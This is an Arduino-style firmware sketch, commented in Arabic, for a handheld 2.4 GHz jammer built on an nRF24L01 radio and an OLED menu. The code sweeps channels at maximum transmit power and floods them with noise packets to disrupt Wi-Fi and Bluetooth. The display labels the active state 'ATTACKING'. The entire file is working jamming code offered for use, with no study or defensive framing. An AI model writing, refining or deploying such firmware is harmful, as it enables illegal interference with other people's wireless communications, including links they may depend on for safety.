#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <SPI.h>
#include <RF24.h>

// إعدادات الشاشة OLED
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

// إعدادات قطعة الـ nRF24L01
// CE -> 17, CSN -> 16
RF24 radio(17, 16); 

// تعريف المنافذ 
const int BTN_NEXT   = 4;   // زر التنقل
const int BTN_SELECT = 5;   // زر الاختيار
const int STATUS_LED = 15;  // مؤشر التشويش

int menuIndex = 0;          // 0 للواي فاي، 1 للبلوتوث
bool jammingActive = false;

void setup() {
  Serial.begin(115200);
  radio.printDetails();

  // إعداد الأزرار والمؤشر
  pinMode(BTN_NEXT, INPUT_PULLUP);
  pinMode(BTN_SELECT, INPUT_PULLUP);
  pinMode(STATUS_LED, OUTPUT);

  // تشغيل الشاشة
  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 allocation failed"));
    for(;;);
  }

  // شاشة الترحيب
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(25, 28);
  display.println("Made by Hasan");
  display.display();
  delay(2000);

  // تشغيل الراديو (التشويش)
  if (!radio.begin()) {
    Serial.println("nRF24L01 connection failed!");
  }
  radio.setPALevel(RF24_PA_MAX); // أقصى قوة إرسال للنسخة التي تملكها
  radio.setDataRate(RF24_2MBPS); // سرعة عالية لزيادة الضجيج
  radio.stopListening();         // وضع الإرسال المستمر
}

void loop() {
  // 1. منطق زر التنقل
  if (digitalRead(BTN_NEXT) == LOW) {
    menuIndex = !menuIndex;  // التبديل بين 0 و 1
    jammingActive = false;   // إيقاف التشويش عند التنقل للأمان
    delay(250);              // لمنع القفز المتكرر
  }

  // 2. منطق زر الاختيار (التشغيل/الإطفاء)
  if (digitalRead(BTN_SELECT) == LOW) {
    jammingActive = !jammingActive;
    delay(250);
  }

  // 3. تنفيذ التشويش الفعلي
 // 3. تنفيذ التشويش الفعلي
  if (jammingActive) {
    digitalWrite(STATUS_LED, HIGH);
    
    // تعريف مصفوفة الضجيج
    const char noise[] = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"; 

    if (menuIndex == 0) { // نمط الواي فاي
        for (int i = 0; i < 70; i++) {
            radio.setChannel(i);
            radio.write(&noise, sizeof(noise));
        }
    } 
    else { // نمط البلوتوث
        for (int i = 0; i < 80; i++) {
            radio.setChannel(i);
            // إرسال مكثف لضرب القفز الترددي
            radio.write(&noise, sizeof(noise));
            radio.write(&noise, sizeof(noise));
            radio.write(&noise, sizeof(noise));
        }
    }
  } else {
    digitalWrite(STATUS_LED, LOW);
  }

  updateDisplay();
}

void updateDisplay() {
  display.clearDisplay();
  display.setTextColor(WHITE);
  
  // العنوان
  display.setTextSize(1);
  display.setCursor(20, 0);
  display.println("- Jamming SYSTEM -");
  display.drawLine(0, 10, 128, 10, WHITE);

  // خيارات القائمة
  display.setCursor(15, 20);
  display.println("WIFI JAMMER");
  if (menuIndex == 0) display.drawRect(5, 17, 118, 14, WHITE);

  display.setCursor(15, 38);
  display.println("BLUETOOTH MODE");
  if (menuIndex == 1) display.drawRect(5, 35, 118, 14, WHITE);

  // شريط الحالة
  if (jammingActive) {
    display.fillRect(0, 52, 128, 12, WHITE);
    display.setTextColor(BLACK);
    display.setCursor(10, 54);
    display.print("ATTACKING: ");
    display.print(menuIndex == 0 ? "WIFI" : "BT");
  } else {
    display.setCursor(10, 54);
    display.print("Status: STANDBY");
  }

  display.display();
}
